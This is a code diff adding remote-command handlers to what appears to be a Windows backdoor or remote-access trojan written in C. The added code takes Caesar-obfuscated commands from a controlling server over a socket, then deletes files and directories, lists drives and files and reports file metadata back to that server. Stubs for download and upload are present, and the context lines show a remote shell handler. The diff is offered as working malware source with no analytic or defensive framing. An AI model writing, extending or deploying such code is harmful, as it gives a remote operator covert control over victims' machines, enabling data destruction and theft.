@@ -183,6 +183,166 @@ retry:
 			goto retry;
 		}
 
+		if (Api.strncmp(server_reply, "ijqdknqj", strlen("ijqdknqj")) == 0) { //del_file
+			char* path = (char*)Api.malloc(MAX_PATH);
+
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			delete_file(path);
+
+			if (Api.send(sock, "itsj", strlen("itsj"), 0) < 0) { //done
+				//send failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			Api.free(path);
+		}
+
+		if (Api.strncmp(server_reply, "ijqdinw", strlen("ijqdinw")) == 0) { //del_dir
+			char* path = (char*)Api.malloc(MAX_PATH);
+
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			delete_dir(path);
+
+			if (Api.send(sock, "itsj", strlen("itsj"), 0) < 0) { //done
+				//send failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+		}
+
+		if (Api.strncmp(server_reply, "ljydtgodnskt", strlen("ljydtgodnskt")) == 0) { //get_obj_info
+			char* path = (char*)Api.malloc(MAX_PATH);
+			struct stat fileinfo;
+
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			int st = Api.stat(CAESAR_DECRYPT(path), &fileinfo);
+			if (st != 0) {
+
+				if (Api.send(sock, CAESAR("N/N"), sizeof(CAESAR("N/N")), 0) < 0) {
+					//send failed
+					Api.free(path);
+					Sleep_(Sleep_TIME);
+					goto retry;
+				}
+
+				Api.free(path);
+				continue;
+			}
+
+			time_t mtime = fileinfo.st_mtime;
+			struct tm* mtime_tm = Api._localtime64(&mtime);
+			char mtime_str[30];
+			char sizeStr[20];
+			Api.strftime(mtime_str, 30, CAESAR_DECRYPT("*^2*r2*i%*M?*R?*X"), mtime_tm);
+
+			// Concatenate the file size and modified time strings separated by "/"
+			Api._snprintf(sizeStr, 20, "%lld", (long long)fileinfo.st_size);
+			int bufferSize = strlen(sizeStr) + 1 + strlen(mtime_str) + 1; // add 1 for the separator and the null terminator
+			char* fileInfoStr = (char*)Api.malloc(bufferSize);
+			Api._snprintf(fileInfoStr, bufferSize, "%s/%s", sizeStr, mtime_str);
+
+			if (Api.send(sock, fileInfoStr, sizeof(fileInfoStr), 0) < 0) {
+				//send failed
+				Api.free(path);
+				Api.free(fileInfoStr);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+			
+			Api.free(fileInfoStr);
+			Api.free(path);
+		}
+
+		if (Api.strncmp(server_reply, "ljydiwn{jx", strlen("ljydiwn{jx")) == 0) { //get_drives
+			char* drives = (char*)Api.malloc(MAX_PATH);
+
+			get_drives_list(drives);
+
+			if (Api.send(sock, drives, strlen(drives), 0) < 0) {
+				//send failed
+				Api.free(drives);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			Api.free(drives);
+		}
+
+		if (Api.strncmp(server_reply, "ljydknqjdqnxy", strlen("ljydknqjdqnxy")) == 0) { //get_file_list
+			char* file_list = (char*)Api.malloc(BUFFER_SIZE);
+			char* path = (char*)Api.malloc(MAX_PATH);
+
+			//Receive a reply from the server
+			if (Api.recv(sock, path, MAX_PATH, 0) <= 0)
+			{
+				//recv failed
+				Api.free(file_list);
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			int num_files;
+			file_list = get_file_list(CAESAR_DECRYPT(path), &num_files);
+
+			if (file_list == NULL) {
+				Api.free(file_list);
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+
+			if (Api.send(sock, file_list, strlen(file_list), 0) < 0) {
+				//send failed
+				Api.free(file_list);
+				Api.free(path);
+				Sleep_(Sleep_TIME);
+				goto retry;
+			}
+
+			Api.free(path);
+		}
+
+		if (Api.strncmp(server_reply, "it|sqtfidknqj", strlen("it|sqtfidknqj")) == 0) { //download_file
+
+		}
+
+		if (Api.strncmp(server_reply, "it|sqtfidinw", strlen("it|sqtfidinw")) == 0) { //download_dir
+
+		}
+
+		if (Api.strncmp(server_reply, "zuqtfidknqj", strlen("zuqtfidknqj")) == 0) { //upload_file
+
+		}
+
 		if (Api.strncmp(server_reply, "xmjqq", strlen("xmjqq")) == 0) { //shell
 			// Set the socket as standard output and error
 			SECURITY_ATTRIBUTES sa;
